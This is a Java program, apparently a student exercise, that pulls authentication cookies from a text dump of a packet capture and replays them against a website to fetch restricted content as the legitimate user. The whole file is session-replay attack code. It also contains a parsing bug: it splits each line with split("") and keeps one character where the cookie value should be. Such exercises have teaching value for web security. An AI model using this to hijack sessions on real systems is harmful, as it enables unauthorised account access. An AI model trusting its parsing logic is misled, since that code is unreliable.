import java.io.*;
import java.net.*;
import java.util.ArrayList;

/*
 * Title: Replay Attack
 * 
 * Author: Jeremiah O'Connor
 * 
 * Purpose: Program that takes the packet capture file (txt format is fine),
 * the URL of your website, and launches a replay attack on your website to access the
 * restricted content as the legitimate user. Make sure that your web server responds 
 * with the restricted content only when the cookie is valid. In other words, this 
 * replayed cookie is an authentication cookie. 
 * 
 */

public class JVisitor {

	public static void main(String[] args) throws IOException {

		
		//reading from pcap file

		BufferedReader pcapFile = null; // init. Wireshark pcap HTTP or HTTPS
										// file to
										// read in
		try {
			String lineID;
			// use buffered reader to convert from binary to text string,
			// use file reader for input string
			pcapFile = new BufferedReader(new FileReader(args[0]));
			ArrayList<String> cookieInfo = new ArrayList<String>();

			while ((lineID = pcapFile.readLine()) != null) { // reading in the file
				String findCookieArray[];
																

//				findCookieArray = lineID.split(":"); // use split on the colon
														// to find cookie

				if (lineID.startsWith("Cookie:")) {
					findCookieArray = lineID.split(""); 										// in pcap file
					

					cookieInfo.add(findCookieArray[1]); // cookie will be second
														// element, name/value of cookie

				}
			}
			pcapFile.close();
			
	

			// need to check cases for more than 1 cookie
			if (cookieInfo.size() >= 1) {

				for (int i = 0; i < cookieInfo.size(); i++) {
					
					// this will be the URL for my website to check for cookie
					URL myWebsite = new URL(args[1]);

					// URL connection to private page.
					URLConnection cookieConnec = myWebsite.openConnection();

					//set the cookie value to send, get all cookies
					//set request cookie for URL connection.
					//set cookie value to send for all cookies in cookieInfo list
					//in this case, only cookie will be 'ABC', 
					//server responds with restricted content when 'ABC'
					
					//cookieConnec.setRequestProperty("User-Agent", "Mozilla/5.0 (X11; Linux i686; rv:7.0.1) Gecko/20100101 Firefox/7.0.1");
					cookieConnec.setRequestProperty("Cookie", cookieInfo.get(i));
					
					// Send cookie request to server
					cookieConnec.connect();

					// use buffered reader to read input stream from private page, bytes to default charset
					BufferedReader brCookie = new BufferedReader(
							new InputStreamReader(cookieConnec.getInputStream()));

					String readCookie;
					while ((readCookie = brCookie.readLine()) != null) {
						System.out.println(readCookie);
					}
					brCookie.close();
				}
			} else {
				System.out.println("Sorry, cookie cannot be found on https pcap file");
			}

		} catch (IOException e) {
			e.printStackTrace();
		}
	}
}